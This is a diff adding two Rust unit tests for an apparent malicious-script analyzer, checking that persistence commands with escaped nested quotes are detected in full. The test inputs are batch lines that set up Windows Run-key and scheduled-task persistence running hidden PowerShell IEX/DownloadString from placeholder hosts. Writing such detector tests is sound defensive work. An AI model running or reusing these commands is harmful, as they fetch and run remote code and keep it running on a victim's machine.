@@ -1599,6 +1599,25 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v updater /d "cmd 
     }
 
     #[test]
+    fn reg_add_run_key_preserves_backslash_escaped_nested_quotes() {
+        let script = br##"@echo off
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "#One" /t REG_SZ /d "powershell -w hidden \"IEX(New-Object Net.WebClient).DownloadString('http://reg-quoted.example/p.ps1');\"" /f
+"##;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence { command, .. }
+                    if command.contains("DownloadString")
+                        && command.contains("reg-quoted.example/p.ps1")
+            )),
+            "Run-key Persistence command was truncated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn reg_add_run_key_does_not_recurse_incomplete_trailing_backslash_command() {
         let script = br#"@echo off
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Reinforce /d "mshta.exe \" /f
@@ -1704,6 +1723,26 @@ schtasks /create /tn "Updater" /tr "cmd /V:ON /c set U=https://schtasks.example/
                         && dst.as_deref() == Some("out.exe")
             )),
             "nested scheduled-task action download missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn schtasks_create_tr_preserves_backslash_escaped_nested_quotes() {
+        let script = br#"@echo off
+schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.WebClient).DownloadString('http://task-quoted.example/p.ps1');\"" /sc minute /mo 60 /f
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence { hive, command, .. }
+                    if hive == "ScheduledTask"
+                        && command.contains("DownloadString")
+                        && command.contains("task-quoted.example/p.ps1")
+            )),
+            "ScheduledTask Persistence command was truncated: {:?}",
             report.traits
         );
     }
